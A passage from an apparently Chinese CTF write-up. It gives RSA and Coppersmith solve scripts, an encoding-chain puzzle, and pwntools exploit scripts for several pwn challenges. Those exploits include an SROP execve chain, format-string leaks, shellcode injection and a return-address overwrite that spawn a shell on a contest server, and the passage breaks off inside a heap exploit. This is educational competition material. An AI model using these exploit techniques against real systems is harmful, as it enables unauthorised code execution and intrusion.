<span class="n">a3</span><span class="p">,</span> <span class="n">b3</span> <span class="o">=</span> <span class="n">calculate_coefficients</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">v3</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">a3</span><span class="p">,</span> <span class="n">b3</span><span class="p">)</span>

<span class="n">a2</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">c2</span> <span class="o">=</span> <span class="n">calculate_a2_b2_c2</span><span class="p">(</span><span class="n">a3</span><span class="p">,</span> <span class="n">b3</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span>

<span class="n">a1</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">d1</span> <span class="o">=</span> <span class="n">calculate_a1_b1_c1_d1</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">c2</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">d1</span><span class="p">)</span>

<span class="c1"># Retrieve flag</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">find_flag</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">d1</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span>

<span class="c1"># Encode the flag into a long integer</span>
<span class="n">m</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="c1"># SageMath part (requires SageMath environment for execution)</span>
<span class="c1"># PR.&lt;x&gt; = Zmod(n)[]</span>
<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">37</span><span class="p">):</span>
    <span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">m</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">l</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span> <span class="o">**</span> <span class="mi">3</span> <span class="o">-</span> <span class="n">c</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span><span class="o">.</span><span class="n">small_roots</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">m</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">l</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="c1"># 12 4</span>
<span class="c1"># 6 4 3</span>
<span class="c1"># 2 2 3 17</span>
<span class="c1"># SageMath decryption result example</span>
<span class="c1"># 102286898985448500467832295645036452673142635639118437925134292610998062324054484334147920750221115490877089576962489904273521769138675607798079373429057407575165</span>
<span class="c1"># sage: long_to_bytes(1022868989854485004678322956450364526731426356391184379251342926109980623240544843341479207502211154</span>
<span class="c1"># ....: 90877089576962489904273521769138675607798079373429057407575165)</span>
</pre></div>
<h1 data-content="1" id="66821a814ea8425661ce75654b4c584a">base</h1>
<p>拿到文件，看见了一堆表情包，往上搜"表情包解码"，发现是emojj表情符号编码，扔到在线解码的网址解码得到base64,然后base64解码得到base85,继续继续！是base91编码的结果！91开解得到很奇怪的字符串，尝试base62,解码出来应该是base16，继续解码！base16得到base32！结果又是base64!flag经过最会一重base64解码得到。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155411-2dddd094-7f01-1.png"/></p>
<h1 data-content="1" id="75ced8a616d3aa0aec253ad59cb55bae">easy_crypto</h1>
<p>nextPrime的生成，先加上2或者1,若不是素数，不断＋2直至生成的数是素数，所以nextprime(x)于本身x差距并不大 ，相当于明说，爆破！！一元二次方程，利用求根公式，先用is_square来加快速度</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">is_square</span><span class="p">,</span> <span class="n">is_prime</span><span class="p">,</span> <span class="n">iroot</span>
<span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">trange</span>

<span class="c1"># RSA Parameters</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">1605247600724752598798254639224215706171506359654961357324428027985787942008103766562745464838961569081446916113769517713344420113584254259000172572811154232107339480903672251992191997458469905064423618888336088652352540882576826988355783159237971043770132628344798937353150930071309347972804118952814447576207066147031238749098842662046825743988208813903138796789940911515825517078554074496474819128789835309636804325132602557092847746454786387067599510769382078521691609970320528531270474091713477040343897269903489441410062592732302402854035415438078656688806905350495825334584533345448091335565792091890185673190424063</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">751639057610677013264061431434189083017589908118307247217007533938435229431015858783222167911772848893015518607229280589985711010766459396989232072512314594917029375221335361209036112742388866873824163350886610514973038316512032459352053158417705406031466332440378871927174731975794579894912999936641163063898365134788537389162378185448090279397717831977803284480743612393591614284972981435749362255654561121758163485884075260156288337176713756471879489767416836868661153693157792733142765671887792303181376620864506386820826866340907593080654521498766421056474652652337037121881207188033108746890998208582406826010121861</span>

<span class="c1"># Function to calculate Legendre symbol (n/p)</span>
<span class="k">def</span> <span class="nf">Legendre</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    Calculate the Legendre symbol (n/p).</span>
<span class="sd">    Returns 1 if n is a quadratic residue modulo p, -1 if not, and 0 if n is divisible by p.</span>
<span class="sd">    """</span>
    <span class="k">return</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

<span class="c1"># Function to perform Tonelli-Shanks algorithm for modular square root</span>
<span class="k">def</span> <span class="nf">Tonelli_Shanks</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    Compute the square root of n modulo prime p using the Tonelli-Shanks algorithm.</span>
<span class="sd">    """</span>
    <span class="k">assert</span> <span class="n">Legendre</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>  <span class="c1"># Ensure n is a quadratic residue mod p</span>
    <span class="k">if</span> <span class="n">p</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

    <span class="c1"># Find q and s such that p - 1 = q * 2^s with q odd</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">q</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">=</span> <span class="n">q</span> <span class="o">//</span> <span class="mi">2</span>
        <span class="n">s</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="c1"># Find a non-quadratic residue z mod p</span>
    <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">Legendre</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">c</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="n">q</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span>

    <span class="k">while</span> <span class="n">t</span> <span class="o">%</span> <span class="n">p</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>
        <span class="k">while</span> <span class="n">temp</span> <span class="o">%</span> <span class="n">p</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>

        <span class="n">b</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">m</span> <span class="o">-</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">p</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">r</span> <span class="o">*</span> <span class="n">b</span> <span class="o">%</span> <span class="n">p</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">b</span> <span class="o">*</span> <span class="n">b</span> <span class="o">%</span> <span class="n">p</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">t</span> <span class="o">*</span> <span class="n">c</span> <span class="o">%</span> <span class="n">p</span>
        <span class="n">m</span> <span class="o">=</span> <span class="n">i</span>

    <span class="k">return</span> <span class="n">r</span>

<span class="c1"># Loop to find prime factors of n</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">42769</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">16</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
        <span class="n">A</span> <span class="o">=</span> <span class="n">x</span>
        <span class="n">B</span> <span class="o">=</span> <span class="mi">38219</span> <span class="o">+</span> <span class="n">y</span>
        <span class="n">C</span> <span class="o">=</span> <span class="o">-</span><span class="n">n</span>
        <span class="n">delta</span> <span class="o">=</span> <span class="n">B</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">A</span> <span class="o">*</span> <span class="n">C</span>  <span class="c1"># Calculate discriminant</span>
        <span class="k">if</span> <span class="n">is_square</span><span class="p">(</span><span class="n">delta</span><span class="p">):</span>  <span class="c1"># Check if discriminant is a perfect square</span>
            <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">B</span> <span class="o">+</span> <span class="n">iroot</span><span class="p">(</span><span class="n">delta</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">//</span> <span class="mi">2</span> <span class="o">//</span> <span class="n">A</span>
            <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>  <span class="c1"># Check if p is prime</span>
                <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
                <span class="c1"># Decrypt the ciphertext</span>
                <span class="n">E1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">inverse</span><span class="p">(</span><span class="mi">65537</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">n</span> <span class="o">//</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)),</span> <span class="n">n</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'{E1=}'</span><span class="p">)</span>

<span class="c1"># E1=mpz(377312346502536339265)</span>
<span class="n">P</span><span class="o">=</span><span class="n">GCD</span><span class="p">(</span><span class="n">N1</span><span class="p">,</span><span class="n">N2</span><span class="p">)</span>
<span class="n">P</span><span class="o">=</span><span class="mi">139221606892711163311861502165720779685040991146236819771077311473266519931947605782571900027963055886773086091452724527664738159398782494677824268515616754695749805253260616352348311702497776259344985568675527862394653437170150947836869132073518219409311180128931469597871185033476336585646820347139844842399</span>
</pre></div>
<p>RSA:</p>
<pre><code>sage: n=2165561783835803789553460516235878432649525146244721848510215599715639413244389154020386091543355991731426745504
....: 684436074362305097508361791580692209669730460387813429596465043039337522579278180472629246092370889072282743655220
....: 901636804742099361349719605932637461621765562581017108054526705826627811264771578475643389580975791707040189561316
....: 891016681256654559340536295348780784053942538312336984274182126052300520847936148489176271474972168383475460159679
....: 670766971808434384527679315364900562859089627928195658860706299939888931424029507352468810829934560930765909193627
....: 0255367762936542565961639163236594456862919813549
....: p=1392216068927111633118615021657207796850409911462368197710773114732665199319476057825719000279630558867730860914
....: 527245276647381593987824946778242685156167546957498052532606163523483117024977762593449855686755278623946534371701
....: 50947836869132073518219409311180128931469597871185033476336585646820347139844842399
....: e=377312346502536339265
....: c=2615722342860373905833491925692465899705229373785773622118746270300793647098821993550686581418882518204094299812
....: 033719020077509270290007615866572202192731169538843513634106977827187688709725198643481375562114294032637211892276
....: 591506759075653224150064709644522873824736707734614347484224826380423111005274801291329132431269949575630918992520
....: 949095837680436317128676927389692790957195674310219740918585437793016218702207192925330821165126647260859644876583
....: 452851011163136097317885847756944279214149072452930036614703451352331567857453770020626414948005358547089607480508
....: 274005888648569717750523094342973767148059329557
....: q=n//p
....: assert p*q==n
....: pph=(p-1)*(q-1)
....: ep=gmpy2.gcd(e,pph)
....: d=inverse_mod(e//ep,pph)
....: fake_m=pow(c,d,p)
....: GF(p)(fake_m).nth_root(ep, all=True)</code></pre>
<p>有很多值，里面最短的可能是正确的FLAG的值，将大整数转换成字节就对了</p>
<h1 data-content="1" id="6e0cac20e86b55710982c8768d09117f">pwn1</h1>
<p>考了srop，一次输出一次输入，当程序执行完 <code>sys_read</code> 后，<strong>函数返回地址</strong>会从栈中被弹出并赋值给指令指针（<code>rip</code>），告诉程序应该跳转到哪个位置继续执行。如果我们通过栈溢出覆盖了这个返回地址，程序就会跳转到我们指定的位置。程序里面还有sh字符串，直接拿下就行</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">c</span>
<span class="c1"># p = process("./pwn")</span>
<span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'101.200.58.4'</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">sigFrame</span><span class="o">=</span><span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">sigFrame</span><span class="o">.</span><span class="n">rax</span><span class="o">=</span><span class="mi">59</span>
<span class="n">sigFrame</span><span class="o">.</span><span class="n">rdi</span><span class="o">=</span><span class="mh">0x40200A</span>
<span class="n">sigFrame</span><span class="o">.</span><span class="n">rsi</span><span class="o">=</span><span class="mh">0x0</span>
<span class="n">sigFrame</span><span class="o">.</span><span class="n">rdx</span><span class="o">=</span><span class="mh">0x0</span>
<span class="n">sigFrame</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="mh">0x40102D</span>
<span class="n">payload</span> <span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40103D</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401034</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401030</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401034</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401030</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401034</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401030</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401034</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40102D</span><span class="p">)</span>
<span class="n">payload</span><span class="o">+=</span><span class="n">flat</span><span class="p">(</span><span class="n">sigFrame</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155423-3567f22c-7f01-1.png"/></p>
<h1 data-content="1" id="ea1fdfa5345721861b7074f4b282c2bf">pwn2</h1>
<p>格式化字符串泄露栈地址，保护全关，直接扔shellcode进去，打ret2shellcode</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'101.200.58.4'</span><span class="p">,</span><span class="mi">10004</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'ask?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="s1">'%6$p'</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0xf0</span><span class="o">-</span><span class="mh">0x80</span>
<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155430-3908915c-7f01-1.png"/></p>
<p>多试几下就好了</p>
<h1 data-content="1" id="9f539161c871e76863995f62c43bd9e1">pwn3</h1>
<p>又是讨厌异架构的一天，要配环境</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155436-3ca8b602-7f01-1.png"/></p>
<p>这里存在格式化字符串，可以泄露地址和任意地址改，程序自带后门，改返回地址为backdoor就可以拿到shell了</p>
<pre><code>STP             X29, X30, [SP,#-0x10+var_s0]!
MOV             X29, SP
ADRL            X0, aBinSh ; "/bin/sh"
BL              .system
NOP
LDP             X29, X30, [SP+var_s0],#0x10
RET</code></pre>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'arm'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'101.200.58.4'</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="p">,</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Our choice: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'size : '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cnt</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'content'</span><span class="p">,</span> <span class="n">cnt</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">cmd</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">'idx: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">'%p%p'</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xea0</span>
<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'content: '</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"%{}c%8$hn"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x18</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">"%{}c%8$hn"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0xd40</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1">#dbg()</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h1 data-content="1" id="420c88ac69dc52d36dd1f22a5908b2be">pwn4</h1>
<p>got表保护没关的高版本堆利用，可以打teach bin，直接修改got表，算是正常堆题</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">elf</span>  <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so.6'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">': '</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'&gt;'</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'2'</span><span class="p">)</span>
